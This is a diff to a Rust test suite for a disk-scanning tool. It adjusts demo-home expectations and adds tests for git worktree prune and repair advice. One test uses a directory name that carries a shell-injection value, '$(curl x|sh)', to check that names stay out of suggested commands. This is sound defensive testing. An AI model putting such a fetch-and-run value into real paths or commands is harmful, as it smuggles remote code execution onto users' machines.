@@ -34,7 +34,7 @@ use std::path::Path;
 
 use harness::{Scanned, scan};
 use kipple_adapters::builtin;
-use kipple_core::{Advice, Evidence, ScanReport, SymbolicRoot};
+use kipple_core::{Advice, Evidence, OwnerStatus, ScanReport, SymbolicRoot};
 use tree::FixtureTree;
 
 fn advice<'r>(report: &'r ScanReport, integration: &str) -> &'r [Advice] {
@@ -63,6 +63,14 @@ fn found(base: &Path, report: &ScanReport) -> Vec<(String, String, Vec<Evidence>
         .collect()
 }
 
+/// Whether `rule` is one of an agent integration's, whose own tests hold what it finds in
+/// the demo.
+fn an_agents(rule: &str) -> bool {
+    ["claude-code", "codex", "cursor", "git", "pi"]
+        .iter()
+        .any(|id| rule.starts_with(&format!("builtin.{id}.")))
+}
+
 fn marker(name: &str) -> Evidence {
     Evidence::Marker(name.to_owned())
 }
@@ -76,6 +84,7 @@ fn every_supported_layout_in_the_demo_home_is_found_with_its_evidence_and_nothin
     let Scanned { temp, report } = scan(&demo_home::tree(demo_home::looked_at()));
 
     let mut found = found(temp.path(), &report);
+    found.retain(|(rule, ..)| !an_agents(rule));
     found.sort();
     let root = |name| vec![Evidence::Root(SymbolicRoot::from_name(name).unwrap())];
     let project = |file: &str, sign: Evidence| vec![marker(file), sign];
@@ -94,6 +103,11 @@ fn every_supported_layout_in_the_demo_home_is_found_with_its_evidence_and_nothin
             "builtin.journald.journal",
             "var/log/journal",
             root("journald.journal"),
+        ),
+        (
+            "builtin.node.node-modules",
+            "home/projects/app/.claude/worktrees/fix-b/node_modules",
+            project("package.json", signature(".package-lock.json")),
         ),
         (
             "builtin.node.node-modules",
@@ -141,9 +155,11 @@ fn every_supported_layout_in_the_demo_home_is_found_with_its_evidence_and_nothin
     .collect::<Vec<_>>();
     expected.sort();
     assert_eq!(found, expected);
+    // This scan has no git to ask, so git says what it couldn't list.
+    let others = report.integrations.iter().filter(|i| i.id.0 != "git");
     assert!(
-        report.integrations.iter().all(|i| i.omissions.is_empty()),
-        "no integration has an omission"
+        others.into_iter().all(|i| i.omissions.is_empty()),
+        "no integration but git has an omission"
     );
 }
 
@@ -299,4 +315,57 @@ fn every_builtin_rule_applies_only_where_its_integration_runs() {
             );
         }
     }
+}
+
+/// Catches a stub reporting its layout as supported, which would open whatever its roots
+/// declare before anything has verified them, or finding something with no fixture behind
+/// it.
+#[test]
+fn a_stub_finds_nothing_and_keeps_its_roots_closed() {
+    let Scanned { report, .. } = scan(&demo_home::tree(demo_home::looked_at()));
+
+    for id in ["cursor", "npm"] {
+        let integration = report.integrations.iter().find(|i| i.id.0 == id).unwrap();
+        assert_eq!(integration.owner, OwnerStatus::Unsupported, "{id}");
+        assert!(
+            report.findings.iter().all(|f| f.integration.0 != id),
+            "{id} found nothing"
+        );
+    }
+}
+
+/// Catches `prune` advised for a checkout still on disk: it drops the admin directory, which
+/// leaves the checkout unable to reach its repository.
+#[test]
+fn only_a_missing_checkout_is_advised_to_prune() {
+    let path = Path::new("/work/moved");
+    let moved = builtin::Anomaly::Unregistered(path, builtin::Unregistered::Moved);
+    let gone = builtin::Anomaly::Unregistered(path, builtin::Unregistered::TargetGone);
+    let snippets = |anomaly| builtin::registration_advice(anomaly).snippets;
+
+    assert_eq!(
+        snippets(builtin::Anomaly::Missing),
+        ["git worktree prune --dry-run --verbose"]
+    );
+    assert_eq!(snippets(moved), ["git worktree repair"]);
+    assert_eq!(snippets(gone), [] as [String; 0]);
+    assert_eq!(snippets(builtin::Anomaly::Invalid), [] as [String; 0]);
+}
+
+/// Catches a directory's name reaching a command: a person pastes the advice, and a
+/// checkout's name can come from a repository or an agent, so `$(…)` would run and a space
+/// would repair the wrong path. The sentence still has to say which directory.
+#[test]
+fn repair_advice_names_the_directory_and_keeps_it_out_of_the_command() {
+    let path = Path::new("/work/my 'app' $(curl x|sh)");
+    let moved = builtin::Anomaly::Unregistered(path, builtin::Unregistered::Moved);
+
+    let advice = builtin::registration_advice(moved);
+
+    assert_eq!(advice.snippets, ["git worktree repair"]);
+    assert!(
+        advice.text.contains(path.to_str().unwrap_or_default()),
+        "says which directory: {}",
+        advice.text
+    );
 }
